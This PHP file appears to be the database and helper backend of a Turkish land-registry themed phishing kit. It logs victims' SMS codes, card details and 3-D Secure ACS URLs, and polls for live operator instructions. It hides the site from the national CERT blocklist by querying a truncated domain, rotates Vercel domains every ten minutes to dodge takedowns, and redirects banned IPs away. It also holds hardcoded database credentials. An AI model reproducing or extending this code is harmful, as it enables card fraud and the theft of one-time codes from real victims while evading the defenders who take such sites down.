<?php
/**
 * db.php — PDO bağlantısı + yardımcı fonksiyonlar
 */

date_default_timezone_set('Europe/Istanbul');

// Dynamically detect base path from SCRIPT_NAME
$base_path = '';
if (isset($_SERVER['SCRIPT_NAME'])) {
    $script = $_SERVER['SCRIPT_NAME'];
    $pos = strpos($script, '/assets/');
    if ($pos === false) {
        $pos = strpos($script, '/includes/');
    }
    if ($pos === false) {
        $pos = strpos($script, '/admin/');
    }
    if ($pos === false) {
        $pos = strpos($script, '/acs/');
    }
    if ($pos === false) {
        $last_slash = strrpos($script, '/');
        if ($last_slash !== false) {
            $base_path = substr($script, 0, $last_slash);
        }
    } else {
        $base_path = substr($script, 0, $pos);
    }
}
define('BASE_PATH', rtrim($base_path, '/'));

define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'tapu_db');
define('DB_USER', getenv('DB_USER') ?: 'r341oot');
define('DB_PASS', getenv('DB_PASS') ?: 'w4L#gMrY8l1io!yj3');

function db_self_heal(PDO $pdo): void {
    static $run = false;
    if ($run) return;
    $run = true;
    try {
        // Create settings table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_ayarlar (
            anahtar VARCHAR(100) PRIMARY KEY,
            deger TEXT
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Create IP banlist table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_ip_banlist (
            ip VARCHAR(45) PRIMARY KEY,
            sebep VARCHAR(255) DEFAULT '',
            olusturuldu DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Create Vercel rotation history table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_vercel_history (
            id INT AUTO_INCREMENT PRIMARY KEY,
            eski_domain VARCHAR(255),
            yeni_domain VARCHAR(255),
            yontem VARCHAR(50),
            tarih DATETIME DEFAULT CURRENT_TIMESTAMP
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Create visitors table if not exists
        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_visitors (
            ip VARCHAR(45) PRIMARY KEY,
            user_agent VARCHAR(512) DEFAULT '',
            son_ziyaret DATETIME DEFAULT CURRENT_TIMESTAMP,
            ziyaret_sayisi INT DEFAULT 1
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");

        // Check columns in tapu_logs
        $q = $pdo->query("SHOW COLUMNS FROM tapu_logs");
        $cols = $q->fetchAll(PDO::FETCH_COLUMN);
        
        $missing = [
            'sms_kod' => "VARCHAR(20) DEFAULT ''",
            'sms_hata_kodlari' => "TEXT",
            'tg_message_id' => "VARCHAR(100) DEFAULT ''",
            'islem' => "VARCHAR(50) DEFAULT ''",
            'aciklama' => "TEXT",
            'mudurlik' => "VARCHAR(200) DEFAULT ''",
            'tarih' => "VARCHAR(20) DEFAULT ''",
            'kart_ad' => "VARCHAR(200) DEFAULT ''",
            'kart_tier' => "VARCHAR(50) DEFAULT ''",
            'admin_mesaj' => "VARCHAR(255) DEFAULT ''",
            'acs_url' => "VARCHAR(255) DEFAULT ''",
            'olusturuldu' => "DATETIME DEFAULT CURRENT_TIMESTAMP"
        ];
        
        foreach ($missing as $col => $definition) {
            if (!in_array($col, $cols)) {
                $pdo->exec("ALTER TABLE tapu_logs ADD `$col` $definition");
            }
        }
    } catch (Exception $e) {
        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [self_heal] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
    }
}

function db(): PDO {
    static $pdo = null;
    if ($pdo === null) {
        $pdo = new PDO(
            'mysql:host='.DB_HOST.';dbname='.DB_NAME.';charset=utf8mb4',
            DB_USER, DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
             PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]
        );
        $pdo->exec("SET time_zone = '+03:00'");
        db_self_heal($pdo);
    }
    return $pdo;
}

/** Kullanıcı IP'sini al */
function get_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            return trim(explode(',', $_SERVER[$k])[0]);
        }
    }
    return '0.0.0.0';
}

// ─────────────────────────────────────────────
// AYARLAR (statik önbellekli — tek SQL)
// ─────────────────────────────────────────────

/** Tüm ayarları tek sorguda yükler ve statik array'de önbellekler */
function _ayar_cache(string $update_key = null, string $update_val = null): array {
    static $cache = null;
    if ($cache === null) {
        $cache = [];
        try {
            $rows = db()->query("SELECT anahtar, deger FROM tapu_ayarlar")->fetchAll();
            foreach ($rows as $r) {
                $cache[$r['anahtar']] = $r['deger'];
            }
        } catch (Exception $e) {}
    }
    if ($update_key !== null) {
        $cache[$update_key] = $update_val;
    }
    return $cache;
}

function ayar_get(string $key, string $default = ''): string {
    $cache = _ayar_cache();
    return $cache[$key] ?? $default;
}

function ayar_set(string $key, string $val): void {
    try {
        db()->prepare("INSERT INTO tapu_ayarlar (anahtar, deger) VALUES (?,?) ON DUPLICATE KEY UPDATE deger=?")
             ->execute([$key, $val, $val]);
        _ayar_cache($key, $val);
    } catch (Exception $e) {}
}

// ─────────────────────────────────────────────
// IP BAN (istek başına tek SQL + statik cache)
// ─────────────────────────────────────────────

function ip_banli_mi(string $ip): bool {
    static $cache = [];
    if (isset($cache[$ip])) return $cache[$ip];
    try {
        $st = db()->prepare("SELECT COUNT(*) FROM tapu_ip_banlist WHERE ip=? LIMIT 1");
        $st->execute([$ip]);
        $cache[$ip] = (int)$st->fetchColumn() > 0;
        return $cache[$ip];
    } catch (Exception $e) { return false; }
}

function ip_ban_ekle(string $ip, string $sebep = ''): void {
    try {
        db()->prepare("INSERT IGNORE INTO tapu_ip_banlist (ip, sebep, olusturuldu) VALUES (?,?,NOW())")
             ->execute([$ip, $sebep]);
    } catch (Exception $e) {}
}

function ip_ban_kaldir(string $ip): void {
    try {
        db()->prepare("DELETE FROM tapu_ip_banlist WHERE ip=?")->execute([$ip]);
    } catch (Exception $e) {}
}

/** Site giriş noktasında IP ban kontrolü — banlıysa yönlendir */
function ip_ban_kontrol(): void {
    $ip = get_ip();
    if (ip_banli_mi($ip)) {
        $url = ayar_get('ban_redirect_url', 'https://www.google.com');
        header("Location: $url");
        exit;
    }
}

// ─────────────────────────────────────────────
// TELEGRAM (DEAKTİVE EDİLDİ)
// ─────────────────────────────────────────────
function tg_token(): string { return ''; }
function tg_chat(): string { return ''; }
function tg_api(string $method, array $params): array { return ['ok' => false]; }
function tg_inline_klavye(int $log_id): array { return []; }
function tg_mesaj_olustur(array $log): string { return ''; }
function tg_mesaj_gonder(int $log_id): void {}
function tg_mesaj_guncelle(int $log_id): void {}

// ─────────────────────────────────────────────
// ZİYARETÇİ & LOG FONKSİYONLARI
// ─────────────────────────────────────────────

function kayit_ziyaretci(): void {
    try {
        $ip = get_ip();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        db()->prepare("
            INSERT INTO tapu_visitors (ip, user_agent)
            VALUES (:ip, :ua)
            ON DUPLICATE KEY UPDATE
              son_ziyaret = NOW(),
              ziyaret_sayisi = ziyaret_sayisi + 1
        ")->execute([':ip' => $ip, ':ua' => substr($ua, 0, 512)]);
    } catch (Exception $e) {}
}

function get_or_create_log(): ?int {
    try {
        $sid = session_id();
        $ip  = get_ip();
        $row = db()->prepare("SELECT id FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        if ($r = $row->fetch()) return (int)$r['id'];
        $ins = db()->prepare("INSERT INTO tapu_logs (session_id, ip, son_aktivite) VALUES (?,?,NOW())");
        $ins->execute([$sid, $ip]);
        return (int)db()->lastInsertId();
    } catch (Exception $e) {
        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [get_or_create_log] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
        return null;
    }
}

function update_log(int $id, array $data): void {
    if (empty($data)) return;
    unset($data['son_aktivite']);
    try {
        $set = implode(', ', array_map(fn($k) => "`$k`=:$k", array_keys($data)));
        $sql = "UPDATE tapu_logs SET $set, son_aktivite=NOW(), guncellendi=NOW() WHERE id=:id";
        $params = $data;
        $params['id'] = $id;
        db()->prepare($sql)->execute($params);
    } catch (Exception $e) {
        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [update_log] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
    }
}

function touch_aktivite(int $id): void {
    try {
        db()->prepare("UPDATE tapu_logs SET son_aktivite=NOW() WHERE id=?")->execute([$id]);
    } catch (Exception $e) {}
}

function heartbeat_check(): array {
    try {
        $sid = session_id();
        db()->prepare("UPDATE tapu_logs SET son_aktivite=NOW() WHERE session_id=?")->execute([$sid]);
        $row = db()->prepare("SELECT id, durum, admin_mesaj, acs_url FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        return $row->fetch() ?: [];
    } catch (Exception $e) { return []; }
}

function get_system_metrics(): array {
    $cpu = 0;
    $ram_percent = 0;
    $ram_used_gb = 0;
    $ram_total_gb = 0;
    
    if (stristr(PHP_OS, 'WIN')) {
        // CPU
        $cpu_out = @shell_exec('wmic cpu get LoadPercentage 2>&1');
        if ($cpu_out) {
            $lines = array_filter(array_map('trim', explode("\n", $cpu_out)));
            foreach ($lines as $line) {
                if (is_numeric($line)) {
                    $cpu = (int)$line;
                    break;
                }
            }
        }
        
        // RAM
        $ram_out = @shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize 2>&1');
        if ($ram_out) {
            $lines = array_filter(array_map('trim', explode("\n", $ram_out)));
            if (count($lines) >= 2) {
                $headers = preg_split('/\s+/', $lines[0]);
                $values = preg_split('/\s+/', $lines[1]);
                
                $free_idx = array_search('FreePhysicalMemory', $headers);
                $total_idx = array_search('TotalVisibleMemorySize', $headers);
                
                if ($free_idx !== false && $total_idx !== false && isset($values[$free_idx], $values[$total_idx])) {
                    $free_kb = (float)$values[$free_idx];
                    $total_kb = (float)$values[$total_idx];
                    $used_kb = $total_kb - $free_kb;
                    $ram_percent = round(($used_kb / $total_kb) * 100, 1);
                    $ram_used_gb = round($used_kb / (1024 * 1024), 2);
                    $ram_total_gb = round($total_kb / (1024 * 1024), 2);
                }
            }
        }
    } else {
        // Linux direct reader (with shell cat fallback to bypass open_basedir)
        // CPU measurement
        $stat1 = @file_get_contents('/proc/stat');
        if ($stat1 === false) {
            $stat1 = @shell_exec('cat /proc/stat 2>&1');
        }
        
        $cpu_parsed = false;
        if ($stat1 && strpos($stat1, 'cpu') === 0) {
            $info1 = explode("\n", $stat1);
            $cpu1 = preg_split('/\s+/', $info1[0]);
            if (count($cpu1) >= 5) {
                // Sum all fields except index 0 ('cpu')
                $total1 = 0;
                foreach ($cpu1 as $k => $v) {
                    if ($k > 0 && is_numeric($v)) {
                        $total1 += (float)$v;
                    }
                }
                $idle1 = (float)$cpu1[4];
                
                // Try session-based delta (3-second window between requests)
                if (session_status() === PHP_SESSION_ACTIVE && isset($_SESSION['last_cpu_total'], $_SESSION['last_cpu_idle'])) {
                    $diff_total = $total1 - $_SESSION['last_cpu_total'];
                    $diff_idle = $idle1 - $_SESSION['last_cpu_idle'];
                    if ($diff_total > 0) {
                        $cpu = round(($diff_total - $diff_idle) / $diff_total * 100, 1);
                        $cpu_parsed = true;
                    }
                }
                
                // Store current ticks for next request
                if (session_status() === PHP_SESSION_ACTIVE) {
                    $_SESSION['last_cpu_total'] = $total1;
                    $_SESSION['last_cpu_idle'] = $idle1;
                }
                
                // Fallback: if no session data yet (first load), calculate with a short sleep
                if (!$cpu_parsed) {
                    usleep(100000); // 100ms
                    $stat2 = @file_get_contents('/proc/stat');
                    if ($stat2 === false) {
                        $stat2 = @shell_exec('cat /proc/stat 2>&1');
                    }
                    if ($stat2) {
                        $info2 = explode("\n", $stat2);
                        $cpu2 = preg_split('/\s+/', $info2[0]);
                        if (count($cpu2) >= 5) {
                            $total2 = 0;
                            foreach ($cpu2 as $k => $v) {
                                if ($k > 0 && is_numeric($v)) {
                                    $total2 += (float)$v;
                                }
                            }
                            $idle2 = (float)$cpu2[4];
                            $diff_total = $total2 - $total1;
                            $diff_idle = $idle2 - $idle1;
                            if ($diff_total > 0) {
                                $cpu = round(($diff_total - $diff_idle) / $diff_total * 100, 1);
                                $cpu_parsed = true;
                            }
                        }
                    }
                }
            }
        }
        
        if (!$cpu_parsed) {
            $loads = @sys_getloadavg();
            if ($loads) {
                $cpu = round($loads[0] * 10, 1);
            }
        }
        
        // RAM measurement
        $ram_parsed = false;
        $meminfo = @file_get_contents('/proc/meminfo');
        if ($meminfo === false) {
            $meminfo = @shell_exec('cat /proc/meminfo 2>&1');
        }
        if ($meminfo && strpos($meminfo, 'MemTotal') !== false) {
            $lines = explode("\n", $meminfo);
            $data = [];
            foreach ($lines as $line) {
                if (strpos($line, ':') !== false) {
                    list($key, $val) = explode(':', $line);
                    $data[trim($key)] = (int)preg_replace('/\D/', '', $val);
                }
            }
            $total_kb = $data['MemTotal'] ?? 0;
            $free_kb = $data['MemFree'] ?? 0;
            // Calculate used as Total - Free to match OS resource usage
            $used_kb = $total_kb - $free_kb;
            if ($used_kb < 0) $used_kb = 0;
            
            $ram_percent = $total_kb > 0 ? round(($used_kb / $total_kb) * 100, 1) : 0;
            $ram_used_gb = round($used_kb / (1024 * 1024), 2);
            $ram_total_gb = round($total_kb / (1024 * 1024), 2);
            $ram_parsed = true;
        }
        
        if (!$ram_parsed) {
            $free = @shell_exec('free -b');
            if ($free) {
                $lines = explode("\n", $free);
                if (isset($lines[1])) {
                    $values = preg_split('/\s+/', $lines[1]);
                    if (count($values) >= 4) {
                        $total = (float)$values[1];
                        $free_mem = (float)$values[3];
                        // used = total - free
                        $used = $total - $free_mem;
                        $ram_percent = round(($used / $total) * 100, 1);
                        $ram_used_gb = round($used / (1024 * 1024 * 1024), 2);
                        $ram_total_gb = round($total / (1024 * 1024 * 1024), 2);
                    }
                }
            }
        }
    }
    
    return [
        'cpu' => $cpu,
        'ram_percent' => $ram_percent,
        'ram_used' => $ram_used_gb,
        'ram_total' => $ram_total_gb
    ];
}

function get_current_domain() {
    $host = $_SERVER['HTTP_HOST'] ?? '';
    $host = explode(':', $host)[0];
    $host = trim(strtolower($host));
    if ($host === 'localhost' || $host === '127.0.0.1' || !$host) {
        return ayar_get('usom_own_domain', '');
    }
    return $host;
}

/**
 * USOM Tehdit İstihbarat API'si üzerinden domain sorgulama (Tamamen Otomatik & Gizli Mod)
 * Sorgu yapılırken domainin tamamının son 1 harfi eksiltilerek USOM'a gönderilir. (Örn: tokifusion.digital -> tokifusion.digita)
 * Eşleşme kontrolü yerel olarak yapılır, böylece USOM botları asıl sitenizi asla öğrenemez.
 */
function usom_check_domain($domain = null) {
    if ($domain === null) {
        $domain = get_current_domain();
    }
    $domain = trim(strtolower($domain));
    if (!$domain) return ['status' => 'error', 'message' => 'Sorgulanacak domain bulunamadı.'];

    // Güvenlik için son harfi eksilt (Örn: tokifusion.digital -> tokifusion.digita)
    $query_domain = $domain;
    if (strlen($domain) > 3) {
        $query_domain = substr($domain, 0, -1);
    }

    $api_url = 'https://siberguvenlik.gov.tr/api/address/index?q=' . urlencode($query_domain);
    
    $response = false;
    $http_code = 0;

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $api_url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        ]);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
    }

    if ($response === false && ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => 'GET',
                'timeout' => 15,
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ];
        $context = stream_context_create($opts);
        $response = @file_get_contents($api_url, false, $context);
        $http_code = ($response !== false) ? 200 : 0;
    }

    if ($response === false) {
        return [
            'status' => 'error',
            'message' => 'USOM API bağlantı hatası: Sunucunuzda cURL ve allow_url_fopen kapalı veya internet erişimi yok.',
            'query_sent' => $query_domain,
            'domain' => $domain
        ];
    }

    if ($http_code !== 200) {
        return [
            'status' => 'error',
            'message' => 'USOM API bağlantı hatası (HTTP ' . $http_code . ')',
            'query_sent' => $query_domain,
            'domain' => $domain
        ];
    }

    $data = json_decode($response, true);
    if (!$data || !isset($data['models'])) {
        return [
            'status' => 'error',
            'message' => 'API yanıtı çözümlenemedi (JSON parse hatası)',
            'query_sent' => $query_domain,
            'domain' => $domain
        ];
    }

    $models = $data['models'] ?? [];
    $matched_records = [];

    // Yerel eşleştirme (Local Filtering)
    foreach ($models as $model) {
        $blocked_url = trim(strtolower($model['url'] ?? ''));
        if (!$blocked_url) continue;

        // Tam domain eşleşmesi kontrol edilir
        if (strpos($blocked_url, $domain) !== false) {
            $matched_records[] = $model;
        }
    }

    if (count($matched_records) > 0) {
        return [
            'status' => 'danger',
            'message' => '⚠️ ZARARLI EŞLEŞME: Domain veya benzeri bir adres USOM veritabanında engellenmiş!',
            'query_sent' => $query_domain,
            'domain' => $domain,
            'matches' => $matched_records
        ];
    }

    return [
        'status' => 'success',
        'message' => '✅ GÜVENLİ: USOM veritabanında bu alan adı ile ilgili eşleşen bir tehdit kaydı bulunamadı.',
        'query_sent' => $query_domain,
        'domain' => $domain,
        'matches' => []
    ];
}

// ─────────────────────────────────────────────
// VERCEL ENTEGRASYONU & OTOMATİK ROTASYON
// ─────────────────────────────────────────────

function get_vercel_token() {
    $file = __DIR__ . '/token.txt';
    if (file_exists($file)) {
        @unlink($file);
    }
    return ayar_get('vercel_token', '');
}

function vercel_api(string $method, string $endpoint, array $body = null) {
    $token = get_vercel_token();
    if (!$token) {
        return ['error' => ['message' => 'Vercel Token bulunamadı.']];
    }

    $url = "https://api.vercel.com" . $endpoint;
    
    $headers = [
        "Authorization: Bearer " . $token,
        "Content-Type: application/json"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    if ($body !== null && in_array($method, ['POST', 'PUT', 'PATCH'])) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $data = json_decode($response, true);
    if ($http_code >= 400) {
        return ['error' => $data['error'] ?? ['message' => "Vercel API Hatası (HTTP $http_code)"]];
    }

    return $data;
}

function delete_vercel_domain($selected_project_id, $domain_to_delete) {
    $main_dom = ayar_get('vercel_redirect_main_domain');
    if ($main_dom && strtolower($domain_to_delete) !== strtolower($main_dom)) {
        $info = vercel_api('GET', "/v9/projects/{$selected_project_id}/domains/{$main_dom}");
        if (isset($info['redirect']) && strtolower($info['redirect']) === strtolower($domain_to_delete)) {
            vercel_api('PATCH', "/v9/projects/{$selected_project_id}/domains/{$main_dom}", [
                'redirect' => null
            ]);
        }
    }
    return vercel_api('DELETE', "/v9/projects/{$selected_project_id}/domains/{$domain_to_delete}");
}

function generate_next_domain($base_domain) {
    $base_domain = trim(strtolower($base_domain));
    $parts = explode('.', $base_domain);
    $count = count($parts);
    $random_suffix = str_pad(rand(100000, 999999), 6, '0', STR_PAD_LEFT);
    
    if ($count >= 2) {
        $tld = $parts[$count - 1];
        $sld = $parts[$count - 2];
        $root_domain = $sld . '.' . $tld;
        
        if ($count == 2) {
            $prefix = preg_replace('/-\d{6}$/', '', $sld);
            $prefix = preg_replace('/\d{6}$/', '', $prefix);
        } else {
            $prefix = preg_replace('/-\d{6}$/', '', $parts[0]);
            $prefix = preg_replace('/\d{6}$/', '', $prefix);
        }
        
        return $prefix . '-' . $random_suffix . '.' . $root_domain;
    }
    
    $base = preg_replace('/-\d{6}$/', '', $base_domain);
    $base = preg_replace('/\d{6}$/', '', $base);
    return $base . '-' . $random_suffix;
}

function vercel_handle_rotation($trigger_method = 'Otomatik') {
    $selected_project_id = ayar_get('selected_vercel_project');
    if (!$selected_project_id) return false;

    $now = time();
    $base_domain = ayar_get('vercel_redirect_main_domain');
    if (!$base_domain) return false;

    // 1. Delete pending old domain if time is up
    $pending_del = ayar_get('vercel_pending_delete_domain');
    $pending_time = (int)ayar_get('vercel_pending_delete_time', '0');
    
    if ($pending_del && $now >= $pending_time) {
        delete_vercel_domain($selected_project_id, $pending_del);
        ayar_set('vercel_pending_delete_domain', '');
        ayar_set('vercel_pending_delete_time', '');
    }

    // 2. Rotate to new domain
    $active_domain = ayar_get('vercel_active_domain');
    
    // Generate next domain
    $new_domain = generate_next_domain($base_domain);

    // Add new domain to Vercel
    $res = vercel_api('POST', "/v9/projects/{$selected_project_id}/domains", ['name' => $new_domain]);
    if (!isset($res['error'])) {
        // Update Main Redirect Domain configuration on Vercel to redirect to the new domain
        vercel_api('PATCH', "/v9/projects/{$selected_project_id}/domains/{$base_domain}", [
            'redirect' => $new_domain,
            'redirectStatusCode' => 302
        ]);

        // Schedule old active domain for deletion in 10 minutes (600 seconds)
        if ($active_domain) {
            ayar_set('vercel_pending_delete_domain', $active_domain);
            ayar_set('vercel_pending_delete_time', (string)($now + 600));
        }
        
        // Update state
        ayar_set('vercel_active_domain', $new_domain);
        ayar_set('vercel_last_rotation_time', (string)$now);

        // Insert rotation details into tapu_vercel_history
        try {
            db()->prepare("INSERT INTO tapu_vercel_history (eski_domain, yeni_domain, yontem, tarih) VALUES (?, ?, ?, NOW())")
                 ->execute([$active_domain ?: '', $new_domain, $trigger_method]);
        } catch (Exception $e) {}

        return $new_domain;
    }
    return false;
}

function vercel_cron_check() {
    $token = get_vercel_token();
    if (!$token) return;

    $selected_project_id = ayar_get('selected_vercel_project');
    if (!$selected_project_id) return;

    $now = time();
    
    // Check if there is an old domain pending deletion and its time has expired
    $pending_del = ayar_get('vercel_pending_delete_domain');
    $pending_time = (int)ayar_get('vercel_pending_delete_time', '0');
    
    if ($pending_del && $now >= $pending_time) {
        delete_vercel_domain($selected_project_id, $pending_del);
        ayar_set('vercel_pending_delete_domain', '');
        ayar_set('vercel_pending_delete_time', '');
    }

    // Check if 10 minutes (600 seconds) have passed since the last rotation
    $last_rot = (int)ayar_get('vercel_last_rotation_time', '0');
    if ($now - $last_rot >= 600) {
        vercel_handle_rotation();
    }
}

function vercel_redirect_check() {
    // Sadece GET isteklerini (ziyaretçileri) yönlendir, POST/AJAX log isteklerine dokunma
    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'GET') {
        return;
    }

    $ana_domain = ayar_get('vercel_redirect_main_domain');
    if (!$ana_domain) return;

    $current_host = trim(strtolower(explode(':', $_SERVER['HTTP_HOST'] ?? '')[0]));
    if ($current_host === trim(strtolower($ana_domain))) {
        // Admin panelini pas geç
        if (strpos($_SERVER['REQUEST_URI'] ?? '', '/admin/') !== false) {
            return;
        }

        // Sadece ana sayfa (kök dizin) ve index.php ziyaretlerini yönlendir (alt dizin uyumlu)
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $clean_uri = strtok($uri, '?');
        
        $expected_root = BASE_PATH . '/';
        $expected_index = BASE_PATH . '/index.php';
        
        if ($clean_uri !== $expected_root && $clean_uri !== $expected_index && $clean_uri !== '') {
            return;
        }

        $aktif_domain = ayar_get('vercel_active_domain');
        if ($aktif_domain && trim(strtolower($aktif_domain)) !== $current_host) {
            $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            header("Location: $proto://$aktif_domain" . $uri, true, 302);
            exit;
        }
    }
}

// Otomatik kontrol ve yönlendirmeyi tetikle
vercel_cron_check();
vercel_redirect_check();
